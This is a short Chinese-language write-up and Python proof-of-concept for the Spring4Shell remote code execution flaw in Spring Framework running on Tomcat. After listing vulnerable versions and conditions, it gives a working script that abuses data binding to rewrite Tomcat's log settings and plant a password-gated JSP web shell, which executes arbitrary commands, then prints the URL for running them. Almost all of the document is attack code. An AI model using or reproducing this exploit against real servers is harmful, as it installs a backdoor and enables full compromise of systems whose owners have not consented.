验证漏洞存在方法
    - 检查目标是否运行 Spring Framework 5.3.0 到 5.3.17、5.2.0 到 5.2.19 或更早版本
    - 确认应用程序是否部署为 WAR 包在 Tomcat 上运行
    - 检查 JDK 版本是否为 9 或更高
    - 发送测试请求检查是否存在数据绑定功能

漏洞利用方法
    - 该漏洞利用 Spring Framework 的数据绑定机制，通过特制的 HTTP 请求参数实现远程代码执行
    - 攻击者可以通过修改 Tomcat 的日志配置，将恶意代码写入 JSP 文件，从而实现 RCE

    import requests
    import sys
    
    def exploit(target_url):
        # 漏洞利用载荷
        payload = {
            'class.module.classLoader.resources.context.parent.pipeline.first.pattern': '%{c2}i if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i',
            'class.module.classLoader.resources.context.parent.pipeline.first.suffix': '.jsp',
            'class.module.classLoader.resources.context.parent.pipeline.first.directory': 'webapps/ROOT',
            'class.module.classLoader.resources.context.parent.pipeline.first.prefix': 'shell',
            'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat': ''
        }
        
        try:
            response = requests.post(target_url, data=payload)
            if response.status_code == 200:
                print(f"[+] 漏洞利用可能成功，尝试访问: {target_url}/shell.jsp?pwd=j&cmd=whoami")
            else:
                print(f"[-] 请求失败，状态码: {response.status_code}")
        except Exception as e:
            print(f"[-] 错误: {e}")
    
    if __name__ == "__main__":
        if len(sys.argv) != 2:
            print("用法: python poc.py http://target.com/path")

        exploit(sys.argv[1])
